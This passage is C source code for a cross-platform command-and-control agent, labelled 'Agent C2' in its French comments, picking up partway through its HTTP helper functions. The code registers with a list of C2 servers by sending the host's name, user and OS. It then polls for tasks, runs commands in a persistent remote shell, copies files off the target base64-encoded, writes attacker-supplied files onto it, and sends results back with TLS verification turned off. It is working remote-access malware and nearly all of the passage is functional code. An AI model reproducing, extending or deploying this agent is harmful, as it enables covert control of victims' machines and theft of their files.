    HINTERNET hConn = WinHttpConnect(hSess, whost, port, 0);
    if (!hConn) {
        WinHttpCloseHandle(hSess);
        resp->data = NULL; resp->size = 0; return -1;
    }

    HINTERNET hReq = WinHttpOpenRequest(
        hConn, L"GET", wpath, NULL,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0
    );
    if (!hReq) {
        WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess);
        resp->data = NULL; resp->size = 0; return -1;
    }

    LPCWSTR hdrs = L"Accept: application/json";
    long    code = -1;

    if (WinHttpSendRequest(hReq, hdrs, (DWORD)-1,
                           WINHTTP_NO_REQUEST_DATA, 0, 0, 0)
        && WinHttpReceiveResponse(hReq, NULL)) {
        code = winhttp_status_and_read(hReq, resp);
    } else {
        resp->data = malloc(1);
        resp->size = 0;
        if (resp->data) resp->data[0] = '\0';
    }

    WinHttpCloseHandle(hReq);
    WinHttpCloseHandle(hConn);
    WinHttpCloseHandle(hSess);
    return code;
}

#else /* PLATFORM_LINUX — libcurl */

static size_t http_write_cb(void *data, size_t size, size_t nmemb, void *userp) {
    size_t real   = size * nmemb;
    HttpBuffer *b = (HttpBuffer *)userp;
    char *ptr = realloc(b->data, b->size + real + 1);
    if (!ptr) return 0;
    b->data = ptr;
    memcpy(b->data + b->size, data, real);
    b->size += real;
    b->data[b->size] = '\0';
    return real;
}

static long http_post_json(const char *url, const char *json_body, HttpBuffer *resp) {
    resp->data = malloc(1); resp->size = 0; resp->data[0] = '\0';
    CURL *curl = curl_easy_init();
    if (!curl) return -1;
    struct curl_slist *hdrs = NULL;
    hdrs = curl_slist_append(hdrs, "Content-Type: application/json");
    hdrs = curl_slist_append(hdrs, "Accept: application/json");
    curl_easy_setopt(curl, CURLOPT_URL,           url);
    curl_easy_setopt(curl, CURLOPT_POST,           1L);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS,     json_body);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER,     hdrs);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION,  http_write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA,      resp);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT,        (long)HTTP_TIMEOUT_SEC);
    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, (long)HTTP_TIMEOUT_SEC);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    long code = -1;
    if (curl_easy_perform(curl) == CURLE_OK)
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &code);
    curl_slist_free_all(hdrs);
    curl_easy_cleanup(curl);
    return code;
}

static long http_get(const char *url, HttpBuffer *resp) {
    resp->data = malloc(1); resp->size = 0; resp->data[0] = '\0';
    CURL *curl = curl_easy_init();
    if (!curl) return -1;
    struct curl_slist *hdrs = NULL;
    hdrs = curl_slist_append(hdrs, "Accept: application/json");
    curl_easy_setopt(curl, CURLOPT_URL,           url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER,    hdrs);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, http_write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA,     resp);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT,       (long)HTTP_TIMEOUT_SEC);
    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT,(long)HTTP_TIMEOUT_SEC);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER,0L);
    long code = -1;
    if (curl_easy_perform(curl) == CURLE_OK)
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &code);
    curl_slist_free_all(hdrs);
    curl_easy_cleanup(curl);
    return code;
}

#endif /* HTTP platform */


/* ============================================================
 *  ENREGISTREMENT
 * ============================================================ */

/**
 * Tente de se connecter à chaque serveur de la liste C2_SERVER_LIST.
 * Retourne 1 et met à jour ctx->server_url dès qu'un serveur répond.
 * Retourne 0 si aucun serveur n'est joignable après un tour complet.
 */
static int try_connect_any_server(AgentContext *ctx, const SystemInfo *si,
                                   const char *saved_id, int has_saved) {
    for (int i = 0; C2_SERVER_LIST[i] != NULL; i++) {
        char url[512];
        snprintf(url, sizeof(url), "%s/agent/register", C2_SERVER_LIST[i]);

        cJSON *p = cJSON_CreateObject();
        cJSON_AddStringToObject(p, "hostname", si->hostname);
        cJSON_AddStringToObject(p, "username", si->username);
        cJSON_AddStringToObject(p, "os",       si->os);
        if (has_saved) cJSON_AddStringToObject(p, "agent_id", saved_id);
        char *body = cJSON_PrintUnformatted(p);
        cJSON_Delete(p);

        HttpBuffer resp = {0};
        long code = http_post_json(url, body, &resp);
        free(body);

        if (code == 200 && resp.data) {
            cJSON *j = cJSON_Parse(resp.data);
            if (j) {
                cJSON *id = cJSON_GetObjectItemCaseSensitive(j, "agent_id");
                if (cJSON_IsString(id)) {
                    /* Serveur trouvé — sauvegarde l'URL active */
                    strncpy(ctx->server_url, C2_SERVER_LIST[i], sizeof(ctx->server_url) - 1);
                    strncpy(ctx->agent_id, id->valuestring, sizeof(ctx->agent_id) - 1);
                    save_agent_id(ctx->agent_id);
                    cJSON *msg = cJSON_GetObjectItemCaseSensitive(j, "message");
                    const char *action = (msg && strcmp(msg->valuestring, "Reconnexion") == 0)
                                         ? "Reconnecté" : "Enregistré";
                    printf("[+] %s via %s — ID: %s\n", action, C2_SERVER_LIST[i], ctx->agent_id);
                    ctx->reconnect_attempts = 0;
                    cJSON_Delete(j);
                    free(resp.data);
                    return 1;
                }
                cJSON_Delete(j);
            }
        }
        if (resp.data) free(resp.data);
    }
    return 0;
}

static int register_agent(AgentContext *ctx, const SystemInfo *si) {
    char saved_id[16] = {0};
    int  has_saved    = load_saved_agent_id(saved_id, sizeof(saved_id));

    while (ctx->running) {
        if (try_connect_any_server(ctx, si, saved_id, has_saved))
            return 1;

        int delay = get_backoff_delay(ctx);
        printf("[!] Aucun serveur joignable — retry dans %ds\n", delay);
        sleep_ms(delay * 1000);
    }
    return 0;
}


/* ============================================================
 *  POLLING
 * ============================================================ */

static int poll_server(AgentContext *ctx, PollResponse *pr) {
    char url[512];
    snprintf(url, sizeof(url), "%s/agent/%s/poll", ctx->server_url, ctx->agent_id);

    HttpBuffer resp = {0};
    long code = http_get(url, &resp);

    if (code == 404) {
        ctx->agent_id[0] = '\0';
        if (resp.data) free(resp.data);
        return -1;
    }
    if (code != 200 || !resp.data) {
        if (resp.data) free(resp.data);
        return 0;
    }

    memset(pr, 0, sizeof(PollResponse));
    cJSON *j = cJSON_Parse(resp.data);
    free(resp.data);
    if (!j) return 0;

    cJSON *ht = cJSON_GetObjectItemCaseSensitive(j, "has_task");
    if (!cJSON_IsTrue(ht)) { cJSON_Delete(j); return 0; }

    pr->has_task = 1;
    cJSON *item;
    item = cJSON_GetObjectItemCaseSensitive(j, "task_id");
    if (cJSON_IsString(item)) strncpy(pr->task_id,   item->valuestring, sizeof(pr->task_id)   - 1);
    item = cJSON_GetObjectItemCaseSensitive(j, "command");
    if (cJSON_IsString(item)) strncpy(pr->command,   item->valuestring, sizeof(pr->command)   - 1);
    item = cJSON_GetObjectItemCaseSensitive(j, "module");
    if (cJSON_IsString(item)) strncpy(pr->module,    item->valuestring, sizeof(pr->module)    - 1);
    else strncpy(pr->module, "shell", sizeof(pr->module) - 1);
    item = cJSON_GetObjectItemCaseSensitive(j, "file_data");
    if (cJSON_IsString(item)) strncpy(pr->file_data, item->valuestring, sizeof(pr->file_data) - 1);
    item = cJSON_GetObjectItemCaseSensitive(j, "filename");
    if (cJSON_IsString(item)) strncpy(pr->filename,  item->valuestring, sizeof(pr->filename)  - 1);

    cJSON_Delete(j);
    return 1;
}


/* ============================================================
 *  MODULES D'EXÉCUTION
 * ============================================================ */

/* Table base64 */
static const char B64[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static void b64_encode(const unsigned char *in, size_t in_len, char *out) {
    size_t i, j = 0;
    for (i = 0; i < in_len; i += 3) {
        unsigned int v = (in[i] << 16);
        if (i+1 < in_len) v |= (in[i+1] << 8);
        if (i+2 < in_len) v |=  in[i+2];
        out[j++] = B64[(v >> 18) & 0x3F];
        out[j++] = B64[(v >> 12) & 0x3F];
        out[j++] = (i+1 < in_len) ? B64[(v >>  6) & 0x3F] : '=';
        out[j++] = (i+2 < in_len) ? B64[ v        & 0x3F] : '=';
    }
    out[j] = '\0';
}

static const int B64_DEC[256] = {
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,
    52,53,54,55,56,57,58,59,60,61,-1,-1,-1,-1,-1,-1,
    -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,10,11,12,13,14,
    15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,
    -1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,
    41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1
};

/**
 * Module download : lit un fichier sur la cible et retourne en base64.
 */
/**
 * Extrait le chemin d'une commande "download <path>" ou "upload <path>".
 * Contrairement à sscanf(%s), supporte les chemins avec des espaces.
 * Supprime les guillemets optionnels et les espaces de fin.
 */
static void extract_path(const char *command, const char *prefix,
                          char *out_path, size_t out_sz) {
    size_t plen = strlen(prefix);
    out_path[0] = '\0';
    if (strncmp(command, prefix, plen) != 0 || strlen(command) <= plen) return;

    const char *p = command + plen;
    while (*p == ' ') p++;                   /* ignore les espaces initiaux */

    if (*p == '"') {                         /* chemin entre guillemets      */
        p++;
        const char *end = strrchr(p, '"');
        size_t len = end ? (size_t)(end - p) : strlen(p);
        if (len >= out_sz) len = out_sz - 1;
        strncpy(out_path, p, len);
        out_path[len] = '\0';
    } else {
        strncpy(out_path, p, out_sz - 1);
    }

    /* Supprime \r\n et espaces de fin */
    size_t n = strlen(out_path);
    while (n > 0 && (out_path[n-1] == '\r' || out_path[n-1] == '\n'
                     || out_path[n-1] == ' '))
        out_path[--n] = '\0';
}

static int exec_download(const char *command, char *out, size_t out_size) {
    char path[1024] = {0};
    extract_path(command, "download ", path, sizeof(path));
    if (!path[0]) {
        strncpy(out, "[ERREUR] Usage: download <chemin_fichier>", out_size - 1); return 0;
    }

#ifdef PLATFORM_WINDOWS
    /* Rejette explicitement les dossiers — donne un message clair */
    DWORD attrs = GetFileAttributesA(path);
    if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
        snprintf(out, out_size,
                 "[ERREUR] '%s' est un dossier — specifiez le chemin complet du fichier",
                 path);
        return 0;
    }
#endif

    FILE *f = fopen(path, "rb");
    if (!f) {
        snprintf(out, out_size, "[ERREUR] Fichier introuvable: %s", path); return 0;
    }
    fseek(f, 0, SEEK_END);
    long fsz = ftell(f); fseek(f, 0, SEEK_SET);
    if (fsz <= 0 || fsz > 10 * 1024 * 1024) {
        fclose(f);
        snprintf(out, out_size, "[ERREUR] Taille invalide: %ld bytes", fsz); return 0;
    }
    unsigned char *raw = malloc(fsz);
    if (!raw) { fclose(f); return 0; }
    fread(raw, 1, fsz, f); fclose(f);

    size_t b64_len = ((fsz + 2) / 3) * 4 + 1;
    if (b64_len >= out_size) {
        free(raw);
        strncpy(out, "[ERREUR] Fichier trop grand pour le buffer", out_size - 1);
        return 0;
    }
    b64_encode(raw, (size_t)fsz, out);
    free(raw);
    return 1;
}

/**
 * Module upload : décode le base64 reçu et écrit le fichier sur la cible.
 */
static int exec_upload(const char *command, const char *b64,
                       const char *filename, char *out, size_t out_size) {
    /*
     * command  : "upload <dest>"  — chemin complet ou dossier
     * b64      : contenu du fichier encodé base64
     * filename : nom original du fichier source (ex: "test.txt")
     *            fourni par le champ JSON "filename" du serveur.
     *            Utilisé si <dest> est un dossier.
     */
    char dest[1024] = {0};
    extract_path(command, "upload ", dest, sizeof(dest));
    if (!dest[0]) {
        strncpy(out, "[ERREUR] Usage: upload <destination>", out_size - 1); return 0;
    }
    if (!b64 || !*b64) {
        strncpy(out, "[ERREUR] Données base64 manquantes", out_size - 1); return 0;
    }

#ifdef PLATFORM_WINDOWS
    /* Défense en profondeur : si dest est un dossier, concatène le filename */
    DWORD attr = GetFileAttributesA(dest);
    if (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY)) {
        if (!filename || !filename[0]) {
            snprintf(out, out_size,
                     "[ERREUR] Destination est un dossier: %s  — specifiez un chemin complet", dest);
            return 0;
        }
        size_t dlen = strlen(dest);
        if (dest[dlen-1] != '\\' && dest[dlen-1] != '/')
            strncat(dest, "\\", sizeof(dest) - dlen - 1);
        strncat(dest, filename, sizeof(dest) - strlen(dest) - 1);
    }
#else
    {
        struct stat st;
        if (stat(dest, &st) == 0 && S_ISDIR(st.st_mode)) {
            if (!filename || !filename[0]) {
                snprintf(out, out_size,
                         "[ERREUR] Destination est un dossier: %s  — specifiez un chemin complet", dest);
                return 0;
            }
            size_t dlen = strlen(dest);
            if (dest[dlen-1] != '/')
                strncat(dest, "/", sizeof(dest) - dlen - 1);
            strncat(dest, filename, sizeof(dest) - strlen(dest) - 1);
        }
    }
#endif

    size_t b64_len  = strlen(b64);
    size_t max_dec  = (b64_len / 4) * 3 + 4;
    unsigned char *dec = malloc(max_dec);
    if (!dec) return 0;

    size_t out_pos = 0;
    for (size_t i = 0; i + 3 < b64_len; i += 4) {
        int v0 = B64_DEC[(unsigned char)b64[i]];
        int v1 = B64_DEC[(unsigned char)b64[i+1]];
        int v2 = (b64[i+2] != '=') ? B64_DEC[(unsigned char)b64[i+2]] : 0;
        int v3 = (b64[i+3] != '=') ? B64_DEC[(unsigned char)b64[i+3]] : 0;
        if (v0 < 0 || v1 < 0) break;
        dec[out_pos++] = (v0 << 2) | (v1 >> 4);
        if (b64[i+2] != '=') dec[out_pos++] = (v1 << 4) | (v2 >> 2);
        if (b64[i+3] != '=') dec[out_pos++] = (v2 << 6) | v3;
    }

    FILE *f = fopen(dest, "wb");
    if (!f) {
        free(dec);
        snprintf(out, out_size, "[ERREUR] Impossible de créer: %s", dest); return 0;
    }
    fwrite(dec, 1, out_pos, f);
    fclose(f); free(dec);
    snprintf(out, out_size, "[OK] Fichier écrit: %s (%zu bytes)", dest, out_pos);
    return 1;
}


/* ============================================================
 *  ENVOI RÉSULTAT
 * ============================================================ */

static int send_result(AgentContext *ctx, const char *task_id,
                       const char *output, const char *status) {
    char url[512];
    snprintf(url, sizeof(url), "%s/agent/result", ctx->server_url);

    cJSON *p = cJSON_CreateObject();
    cJSON_AddStringToObject(p, "task_id",  task_id);
    cJSON_AddStringToObject(p, "agent_id", ctx->agent_id);
    cJSON_AddStringToObject(p, "output",   output);
    cJSON_AddStringToObject(p, "status",   status);
    char *body = cJSON_PrintUnformatted(p);
    cJSON_Delete(p);

    HttpBuffer resp = {0};
    long code = http_post_json(url, body, &resp);
    free(body);
    if (resp.data) free(resp.data);
    return (code == 200);
}


/* ============================================================
 *  BOUCLE PRINCIPALE
 * ============================================================ */

static void poll_loop(AgentContext *ctx, const SystemInfo *si,
                      PersistentShell *shell) {
    printf("[*] Agent %s actif — polling toutes les ~%dms\n",
           ctx->agent_id, POLL_INTERVAL_MS);

    while (ctx->running) {
        PollResponse pr = {0};
        int ret = poll_server(ctx, &pr);

        if (ret == -1) {
            /* Agent inconnu du serveur → réenregistrement */
            if (!register_agent(ctx, si)) break;
            continue;
        }

        if (ret == 1 && pr.has_task) {
            printf("[>] Task %s | %s | %.60s\n",
                   pr.task_id, pr.module, pr.command);

            char   *output  = malloc(MAX_OUTPUT_SIZE);
            int     success = 0;
            const char *status;

            if (!output) { sleep_ms(get_jittered_interval()); continue; }
            output[0] = '\0';

            if (strcmp(pr.module, "shell") == 0) {
                success = shell_run(shell, pr.command, pr.task_id,
                                    output, MAX_OUTPUT_SIZE);
                if (!success && output[0] == '\0')
                    strncpy(output, "[ERREUR] Exécution échouée", MAX_OUTPUT_SIZE - 1);
                /* shell_run retourne 1 même pour des commandes qui "échouent"
                   (ex: commande introuvable) — le shell lui-même a bien fonctionné */
                success = 1;

            } else if (strcmp(pr.module, "download") == 0) {
                success = exec_download(pr.command, output, MAX_OUTPUT_SIZE);

            } else if (strcmp(pr.module, "upload") == 0) {
                success = exec_upload(pr.command, pr.file_data,
                                      pr.filename, output, MAX_OUTPUT_SIZE);

            } else if (strcmp(pr.module, "sysinfo") == 0) {
                build_sysinfo(si, output, MAX_OUTPUT_SIZE);
                success = 1;

            } else {
                snprintf(output, MAX_OUTPUT_SIZE, "[ERREUR] Module inconnu: %s", pr.module);
            }

            status = success ? "success" : "error";

            if (send_result(ctx, pr.task_id, output, status))
                printf("[+] Résultat envoyé [%s]\n", status);
            else
                printf("[!] Échec envoi résultat\n");

            free(output);
        }

        sleep_ms(get_jittered_interval());
    }
}


/* ============================================================
 *  POINT D'ENTRÉE
 * ============================================================ */

int main(void) {
#ifdef PLATFORM_WINDOWS
    /* Force l'encodage UTF-8 dans la console Windows.
     * Sans ça, les caractères accentués (é, —, etc.) s'affichent
     * comme ÔÇö / ├® car la console utilise cp1252 par défaut. */
    SetConsoleOutputCP(CP_UTF8);
    SetConsoleCP(CP_UTF8);
#endif
#ifdef PLATFORM_LINUX
    curl_global_init(CURL_GLOBAL_DEFAULT);  /* Linux uniquement */
#endif
    srand((unsigned int)time(NULL));

    AgentContext ctx = {0};
    ctx.running      = 1;
    /* server_url sera rempli par try_connect_any_server() au premier contact */

    SystemInfo si;
    collect_system_info(&si);

    printf("[*] Agent C2 — %s — %s\n", si.os, ctx.server_url);

    /* Initialise le shell persistant */
    PersistentShell shell;
    memset(&shell, 0, sizeof(shell));
#ifdef PLATFORM_LINUX
    shell.fd_stdin_write = shell.fd_stdout_read = -1;
#endif

    /* Boucle principale : enregistrement + polling */
    while (ctx.running) {
        if (ctx.agent_id[0] == '\0') {
            if (!register_agent(&ctx, &si)) break;
            if (!shell_start(&shell)) {
                printf("[!] Impossible de démarrer le shell\n");
                break;
            }
        }
        poll_loop(&ctx, &si, &shell);
    }

#ifdef PLATFORM_LINUX
    curl_global_cleanup();  /* Linux uniquement */
#endif
    return 0;
}
